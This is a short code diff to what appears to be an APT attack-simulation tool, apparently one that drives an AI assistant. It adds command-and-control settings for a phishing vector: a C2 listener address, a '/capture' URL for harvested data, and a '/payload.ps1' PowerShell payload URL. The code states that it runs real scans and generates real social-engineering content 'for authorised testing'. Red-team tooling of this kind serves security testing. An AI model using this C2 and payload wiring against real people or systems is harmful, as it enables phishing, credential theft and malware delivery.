@@ -208,13 +208,20 @@ def run_apt_agent(
     cross_target: str = "",
     assistant_factory: Callable[[str, list[str]], Any] | None = None,
     resume: bool = False,
+    c2_host: str = "",
+    c2_port: int = 8080,
 ) -> dict[str, Any]:
     """APT 攻击模拟主入口 — 单目标单向量，supply_chain 支持跨目标"""
     from .apt_tools import WARNING_TEXT as APT_WARNING
+    from .config import C2_HOST, C2_PORT
     print(f"[!] {APT_WARNING}")
     print(f"[!] 攻击向量: {vector}")
     if cross_target:
         print(f"[!] 跳板攻击: {target} -> {cross_target}")
+    if vector == "phishing":
+        _c2_h = c2_host or C2_HOST
+        _c2_p = c2_port or C2_PORT
+        print(f"[!] C2 监听器: http://{_c2_h}:{_c2_p}")
     print("[!] 此模式执行真实 DNS 解析/端口扫描/技术识别和社工内容生成！仅用于授权测试！")
 
     if not target:
@@ -224,6 +231,13 @@ def run_apt_agent(
     if cross_target and vector == "supply_chain":
         sim_target["cross_host"] = cross_target
         sim_target["cross_id"] = "target_cross"
+    if vector == "phishing":
+        _c2_h = c2_host or C2_HOST
+        _c2_p = c2_port or C2_PORT
+        from .c2_listener import get_local_ip
+        _local_ip = get_local_ip()
+        sim_target["c2_url"] = f"http://{_local_ip}:{_c2_p}/capture"
+        sim_target["c2_payload_url"] = f"http://{_local_ip}:{_c2_p}/payload.ps1"
 
     return run_apt_simulation(sim_target, assistant_factory=assistant_factory, resume=resume)
 
